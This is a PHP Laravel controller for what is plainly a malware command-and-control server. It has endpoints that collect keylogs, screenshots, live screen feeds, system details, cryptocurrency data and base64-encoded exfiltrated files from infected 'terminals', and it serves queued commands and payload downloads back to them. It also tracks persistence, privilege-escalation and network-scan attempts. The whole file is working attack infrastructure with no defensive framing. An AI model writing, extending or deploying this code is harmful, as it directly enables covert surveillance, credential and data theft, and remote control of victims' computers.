<?php

namespace App\Http\Controllers\Api;

use App\Http\Controllers\Controller;
use Illuminate\Http\Request;
use App\Services\C2Service;
use App\Repositories\TelemetryRepository;
use Illuminate\Support\Facades\Log;

class C2Controller extends Controller
{
    private $c2Service;
    private $telemetryRepo;

    public function __construct(C2Service $c2Service, TelemetryRepository $telemetryRepo)
    {
        $this->c2Service = $c2Service;
        $this->telemetryRepo = $telemetryRepo;
    }

    public function statusUpdate(Request $request)
    {
        $data = $request->json()->all();
        $terminalId = $data['id'] ?? 'unknown';

        Log::info("[C2] Status update received from terminal: $terminalId", ['ip' => $request->ip()]);

        // Always update terminal status if ID is present
        if ($terminalId !== 'unknown') {
            Log::info("[C2] Updating status for terminal: $terminalId");
            $this->c2Service->updateTerminalStatus($terminalId, $data);

            // Process Keylogs
            if (!empty($data['keylog'])) {
                Log::info("[C2] Processing keylogs for terminal: $terminalId", ['length' => strlen($data['keylog'])]);
                $this->c2Service->saveKeylogData($terminalId, $data['keylog']);
            }
            
            // Process System Info (Comprehensive)
            if (!empty($data['system_info'])) {
                Log::info("[C2] Processing detailed system info for terminal: $terminalId");
                $this->c2Service->updateTerminalSystemInfo($terminalId, $data['system_info']);
            } else {
                Log::info("[C2] Constructing basic system info for terminal: $terminalId (missing detailed object)");
                // Construct basic system info from root keys if system_info object is missing
                $sysInfo = [
                    'os_version' => $data['os'] ?? 'unknown',
                    'architecture' => $data['arch'] ?? 'unknown',
                    'hostname' => $data['hostname'] ?? 'unknown',
                    'username' => $data['username'] ?? 'unknown',
                    'local_ip' => $data['local_ip'] ?? 'unknown',
                    'mac_address' => $data['mac_address'] ?? 'unknown'
                ];
                $this->c2Service->updateTerminalSystemInfo($terminalId, $sysInfo);
            }

            // Process WebRTC
            if (!empty($data['webrtc_candidates'])) {
                Log::info("[C2] Processing WebRTC candidates for terminal: $terminalId");
                $this->c2Service->processWebRTCCandidates($terminalId, $data['webrtc_candidates']);
            }
            
            // Check queues for commands/payloads
            Log::info("[C2] Checking queues for terminal: $terminalId");
            $payload = $this->c2Service->checkPayloadQueue($terminalId);
            $commands = $this->c2Service->checkCommandQueue($terminalId);

            $response = [
                'status' => 'success',
                'message' => 'Online confirmed'
            ];

            if ($payload) {
                 Log::info("[C2] Serving payload to terminal: $terminalId", ['file' => $payload['payload_file']]);
                 // Logic to serve payload
                 $filePath = $payload['payload_file'];
                 if (file_exists($filePath)) {
                    return response()->download($filePath, 'payload.zip', ['Content-Type' => 'application/zip']);
                 }
            }

            if (!empty($commands)) {
                Log::info("[C2] Sending commands to terminal: $terminalId", ['count' => count($commands)]);
                $response['commands'] = $commands;
            }
            
            $candidates = $this->c2Service->getWebRTCCandidates($terminalId);
            if ($candidates) {
                 Log::info("[C2] Sending WebRTC candidates to terminal: $terminalId");
                 $response['webrtc_candidates'] = $candidates;
            }
            
            return response()->json($response);
        }

        Log::error("[C2] Invalid request format from IP: " . $request->ip());
        return response()->json(['error' => 'Invalid request format'], 400);
    }

    public function upload(Request $request)
    {
        $terminalId = $request->header('X-Terminal-Id') ?? $request->query('id') ?? 'unknown';

        Log::info("[C2] Upload request from terminal: $terminalId", ['ip' => $request->ip()]);

        if ($request->hasFile('screenshot')) {
            Log::info("[C2] Processing screenshot upload for terminal: $terminalId");
            $this->c2Service->saveScreenshotData($terminalId, $request->file('screenshot'));
            return response()->json(['status' => 'success', 'message' => 'Screenshot uploaded successfully']);
        }
        
        if ($request->hasFile('file')) {
             $file = $request->file('file');
             $timestamp = time();
             $name = pathinfo($file->getClientOriginalName(), PATHINFO_FILENAME) . '_' . $timestamp . '.' . $file->getClientOriginalExtension();
             
             Log::info("[C2] Processing file upload for terminal: $terminalId", ['filename' => $name, 'size' => $file->getSize()]);
             
             $uploadDir = storage_path('app/c2_data/uploads/' . $terminalId);
             if (!is_dir($uploadDir)) mkdir($uploadDir, 0755, true);
             
             $file->move($uploadDir, $name);
             $this->c2Service->updateTerminalFile($terminalId, $name, $file->getMimeType(), filesize($uploadDir . '/' . $name));
             return response()->json(['status' => 'success', 'message' => 'File uploaded successfully']);
        }

        Log::warning("[C2] Upload request failed: No file provided from terminal $terminalId");
        return response()->json(['status' => 'error', 'message' => 'No file provided'], 400);
    }

    public function systemInfo(Request $request)
    {
        $data = $request->json()->all();
        $terminalId = $data['id'] ?? 'unknown';
        
        $this->c2Service->updateTerminalSystemInfo($terminalId, $data);
        
        // Also save to file
        $sysInfoDir = storage_path('app/c2_data/systeminfo/' . $terminalId);
        if (!is_dir($sysInfoDir)) mkdir($sysInfoDir, 0755, true);
        file_put_contents($sysInfoDir . '/info_' . time() . '.json', json_encode($data));
        
        return response()->json(['status' => 'success', 'message' => 'System information received']);
    }

    public function listTerminals()
    {
        $this->c2Service->cleanupTerminals();
        $terminals = $this->c2Service->getOnlineTerminals();
        return response()->json([
            'status' => 'success',
            'terminals' => array_values($terminals),
            'count' => count($terminals)
        ]);
    }
    
    public function getLiveFeed($id)
    {
        $uploadDir = storage_path('app/c2_data/uploads/' . $id);
        if (!is_dir($uploadDir)) {
            return $this->noFeedResponse();
        }
        
        $files1 = glob($uploadDir . '/screenshot_*.*');
        $files2 = glob($uploadDir . '/stream_frame_*.*');
        $files = array_merge($files1 ?: [], $files2 ?: []);
        
        if (empty($files)) return $this->noFeedResponse();
        
        usort($files, function($a, $b) {
            return filemtime($b) - filemtime($a);
        });
        
        $latest = $files[0];
        return response()->file($latest);
    }
    
    private function noFeedResponse()
    {
         return response('<svg width="300" height="200" xmlns="http://www.w3.org/2000/svg"><rect width="100%" height="100%" fill="#333"/><text x="50%" y="50%" font-family="Arial" font-size="18px" fill="#666" text-anchor="middle">No Feed</text></svg>')
            ->header('Content-Type', 'image/svg+xml');
    }

    public function exfiltrate(Request $request)
    {
        $data = $request->json()->all();
        $terminalId = $data['terminal_id'] ?? 'unknown';
        $filename = $data['filename'] ?? 'unknown.bin';
        $content = $data['data'] ?? ''; // Base64
        
        if (empty($content)) {
            return response()->json(['status' => 'error', 'message' => 'No data'], 400);
        }
        
        // Decode base64
        $fileData = base64_decode($content);
        
        // Save file
        $uploadDir = storage_path('app/c2_data/uploads/' . $terminalId);
        if (!is_dir($uploadDir)) mkdir($uploadDir, 0755, true);
        
        file_put_contents($uploadDir . '/' . $filename, $fileData);
        
        // Update terminal file list
        $this->c2Service->updateTerminalFile($terminalId, $filename, 'application/octet-stream', strlen($fileData));
        
        return response()->json(['status' => 'success']);
    }
    public function webrtcRegister(Request $request) {
        $data = $request->json()->all();
        $this->c2Service->registerWebRTCSession($data);
        return response()->json(['status' => 'success']);
    }
    
    public function webrtcHeartbeat(Request $request) {
        $data = $request->json()->all();
        $sessionId = $data['session_id'] ?? null;
        if ($sessionId) $this->c2Service->updateWebRTCHeartbeat($sessionId, $data);
        return response()->json(['status' => 'success']);
    }
    
    public function webrtcPollCommands($sessionId) {
        $cmd = $this->c2Service->getWebRTCCommands($sessionId);
        return response($cmd);
    }
    
    public function webrtcResult(Request $request) {
        $data = $request->json()->all();
        $this->c2Service->saveWebRTCResult($data);
        return response()->json(['status' => 'success']);
    }

    public function checkForUpdates() {
        return response()->json(null);
    }

    public function storeLogs(Request $request)
    {
        $data = $request->json()->all();
        
        $terminalId = $data['terminal_id'] ?? 'unknown';
        $logs = $data['logs'] ?? [];
        
        if (empty($logs)) return response()->json(['status' => 'ok']);
        
        $logDir = storage_path('app/c2_data/logs/' . $terminalId);
        if (!is_dir($logDir)) mkdir($logDir, 0755, true);
        
        // Append to day log
        $today = date('Y-m-d');
        $logFile = $logDir . "/{$today}.log";
        
        foreach ($logs as $log) {
            $line = sprintf("[%s] [%s] [%s] %s", 
                $log['Timestamp'] ?? date('Y-m-d H:i:s'),
                isset($log['Level']) ? $log['Level'] : 'INFO',
                $log['Module'] ?? 'General',
                $log['Message'] ?? ''
            );
            if (isset($log['Context']) && !empty($log['Context'])) {
                $line .= " | Context: " . json_encode($log['Context']);
            }
            file_put_contents($logFile, $line . PHP_EOL, FILE_APPEND);
        }
        
        return response()->json(['status' => 'success']);
    }
    
    public function getTelemetry($terminalId)
    {
        $filters = request()->only(['date_from', 'date_to', 'level', 'module', 'search']);
        $logs = $this->c2Service->getTelemetryLogs($terminalId, $filters);
        return response()->json($logs);
    }
    
    public function getScreenshots($terminalId)
    {
        $page = request()->query('page', 1);
        $perPage = request()->query('per_page', 20);
        $gallery = $this->c2Service->getScreenshotGallery($terminalId, $page, $perPage);
        return response()->json($gallery);
    }
    
    public function getKeylogs($terminalId)
    {
        $search = request()->query('search', '');
        $page = request()->query('page', 1);
        $keylogs = $this->c2Service->getKeyloggerData($terminalId, $search, $page);
        return response()->json($keylogs);
    }
    
    public function getCryptoData($terminalId)
    {
        $crypto = $this->c2Service->getCryptocurrencyData($terminalId);
        return response()->json($crypto);
    }
    
    public function getTimeline($terminalId)
    {
        $limit = request()->query('limit', 50);
        $timeline = $this->c2Service->getTerminalTimeline($terminalId, $limit);
        return response()->json($timeline);
    }

    /**
     * Process batch telemetry from XYZ client
     */
    public function receiveTelemetryBatch(Request $request)
    {
        $data = $request->json()->all();
        $terminalId = $data['terminal_id'] ?? null;
        $reports = $data['reports'] ?? [];

        if (!$terminalId || empty($reports)) {
            return response()->json(['status' => 'error', 'message' => 'Invalid data'], 400);
        }

        try {
            $count = $this->telemetryRepo->processBatch($terminalId, $reports);
            
            // Also update terminal last seen
            $this->c2Service->updateTerminalStatus($terminalId, ['id' => $terminalId, 'last_seen' => time()]);

            return response()->json([
                'status' => 'success',
                'processed' => $count
            ]);
        } catch (\Exception $e) {
            Log::error("Telemetry batch error: " . $e->getMessage());
            return response()->json(['status' => 'error', 'message' => $e->getMessage()], 500);
        }
    }

    public function getPersistenceAttempts($terminalId)
    {
        $attempts = \App\Models\PersistenceAttempt::where('terminal_id', $terminalId)
            ->latest('attempted_at')
            ->get();
        return response()->json($attempts);
    }

    public function getEscalationAttempts($terminalId)
    {
        $attempts = \App\Models\PrivilegeEscalationAttempt::where('terminal_id', $terminalId)
            ->latest('attempted_at')
            ->get();
        return response()->json($attempts);
    }

    public function getNetworkScans($terminalId)
    {
        $scans = \App\Models\NetworkScan::where('terminal_id', $terminalId)
            ->latest('started_at')
            ->get();
        return response()->json($scans);
    }
}
